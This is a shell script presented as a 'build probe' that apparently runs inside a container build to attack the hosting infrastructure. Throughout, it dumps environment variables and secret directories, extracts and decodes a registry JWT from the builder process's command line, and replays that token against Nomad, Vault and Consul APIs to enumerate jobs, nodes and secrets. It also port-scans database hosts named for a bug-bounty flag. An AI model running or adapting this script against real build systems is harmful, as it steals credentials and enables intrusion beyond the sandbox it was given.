#!/bin/sh
exec > /build_output.txt 2>&1

echo "=== BUILD PROBE R46 ==="
date

echo "--- ENV ---"
env | sort

echo "--- PROC1 CMDLINE ---"
cat /proc/1/cmdline 2>/dev/null | tr '\0' '\n'

echo "--- MOUNTS ---"
mount 2>/dev/null | head -30

echo "--- FILES ---"
ls -la /secrets/ 2>/dev/null
ls -la /run/secrets/ 2>/dev/null
cat /etc/hosts 2>/dev/null
cat /etc/resolv.conf 2>/dev/null

# Extract JWT from builder PID 1
JWT=$(cat /proc/1/cmdline 2>/dev/null | tr '\0' '\n' | grep -A1 'registry-auths' | tail -1 | python3 -c "
import sys,json
try:
    data=json.loads(sys.stdin.read())
    print(data[0]['password'])
except: pass
" 2>/dev/null)
echo "JWT_LEN=${#JWT}"
if [ ${#JWT} -gt 10 ]; then
  echo "JWT_FIRST20=${JWT:0:20}..."
  # Decode JWT payload
  echo "--- JWT PAYLOAD ---"
  echo "$JWT" | cut -d. -f2 | python3 -c "
import sys,base64,json
s=sys.stdin.read().strip()
s+='=' * (4 - len(s) % 4)
try:
    d=json.loads(base64.b64decode(s))
    for k,v in sorted(d.items()):
        print(f'{k}={v}')
except Exception as e: print(f'err: {e}')
" 2>/dev/null
fi

N=http://169.254.1.2:4646

echo "--- NOMAD AGENT SELF ---"
curl -s --connect-timeout 3 "$N/v1/agent/self" 2>&1 | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    print(json.dumps(d, indent=2)[:2000])
except Exception as e: print(f'err: {e}: '+sys.stdin.read()[:200])
" 2>/dev/null

echo "--- NOMAD ALLOCATIONS ---"
curl -s --connect-timeout 3 "$N/v1/allocations" 2>&1 | python3 -c "
import sys,json
try:
    data=json.load(sys.stdin)
    if isinstance(data, list):
        for a in data:
            print(f'ID={a.get(\"ID\",\"\")} Job={a.get(\"JobID\",\"\")} Task={a.get(\"TaskGroup\",\"\")} NS={a.get(\"Namespace\",\"\")} Status={a.get(\"ClientStatus\",\"\")}')
    else:
        print(data)
except Exception as e: print(f'err: {e}')
" 2>/dev/null

echo "--- NOMAD ALLOCATIONS WITH JWT ---"
curl -s --connect-timeout 3 "$N/v1/allocations" -H "Authorization: Bearer $JWT" 2>&1 | python3 -c "
import sys,json
try:
    data=json.load(sys.stdin)
    if isinstance(data, list):
        for a in data:
            print(f'ID={a.get(\"ID\",\"\")} Job={a.get(\"JobID\",\"\")} Task={a.get(\"TaskGroup\",\"\")} NS={a.get(\"Namespace\",\"\")} Status={a.get(\"ClientStatus\",\"\")}')
    else:
        print(data)
except Exception as e: print(f'err: {e}')
" 2>/dev/null

echo "--- NOMAD JOBS ---"
curl -s --connect-timeout 3 "$N/v1/jobs" -H "Authorization: Bearer $JWT" 2>&1 | python3 -c "
import sys,json
try:
    data=json.load(sys.stdin)
    if isinstance(data, list):
        for j in data:
            print(f'ID={j.get(\"ID\",\"\")} Type={j.get(\"Type\",\"\")} Status={j.get(\"Status\",\"\")} NS={j.get(\"Namespace\",\"\")}')
    else:
        print(data)
except Exception as e: print(f'err: {e}')
" 2>/dev/null

echo "--- NOMAD NAMESPACES ---"
curl -s --connect-timeout 3 "$N/v1/namespaces" -H "Authorization: Bearer $JWT" 2>&1 | python3 -c "
import sys,json
try:
    data=json.load(sys.stdin)
    if isinstance(data, list):
        for n in data:
            print(f'Name={n.get(\"Name\",\"\")} Desc={n.get(\"Description\",\"\")}')
    else:
        print(data)
except Exception as e: print(f'err: {e}')
" 2>/dev/null

echo "--- NOMAD NODES ---"
curl -s --connect-timeout 3 "$N/v1/nodes" -H "Authorization: Bearer $JWT" 2>&1 | python3 -c "
import sys,json
try:
    data=json.load(sys.stdin)
    if isinstance(data, list):
        for n in data[:10]:
            print(f'ID={n.get(\"ID\",\"\")} Name={n.get(\"Name\",\"\")} DC={n.get(\"Datacenter\",\"\")} Status={n.get(\"Status\",\"\")}')
    else:
        print(data)
except Exception as e: print(f'err: {e}')
" 2>/dev/null

# Own allocation
ALLOC=$(sed -n 's|.*alloc/\([a-f0-9-]*\)/.*|\1|p' /proc/self/mountinfo 2>/dev/null | head -1)
echo "OWN_ALLOC=$ALLOC"

if [ -n "$ALLOC" ]; then
  echo "--- OWN ALLOC FS ---"
  curl -s --connect-timeout 3 "$N/v1/client/fs/ls/$ALLOC" 2>&1 | head -c 500
  echo
  for f in secrets/ local/; do
    echo "==$f=="
    curl -s --connect-timeout 3 "$N/v1/client/fs/ls/${ALLOC}?path=$f" 2>&1 | head -c 500
    echo
  done
fi

# Try falcon PG from build network
echo "--- FALCON PG CONNECTIVITY ---"
for host in 132.145.163.127 10.1.47.111 falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com; do
  for port in 12691 5432 28319; do
    echo -n "$host:$port -> "
    nc -w 3 -z "$host" "$port" 2>&1 && echo "OPEN" || echo "closed/timeout"
  done
done

# Internal DNS probes
echo "--- INTERNAL DNS ---"
dig +short falcon-bug-bounty-flag-pgsql.dev-sandbox.svc.cluster.local 2>/dev/null
dig +short falcon-bug-bounty-flag-pgsql.aivencloud.com 2>/dev/null
nslookup 10.1.47.111 2>/dev/null | head -5

# Vault / Consul
echo "--- VAULT ---"
curl -s --connect-timeout 3 http://169.254.1.2:8200/v1/sys/health 2>&1 | head -200
echo "--- CONSUL ---"
curl -s --connect-timeout 3 http://169.254.1.2:8500/v1/catalog/services 2>&1 | head -500

# Capabilities
echo "--- CAPS ---"
cat /proc/self/status | grep -i cap

echo "=== BUILD DONE ==="
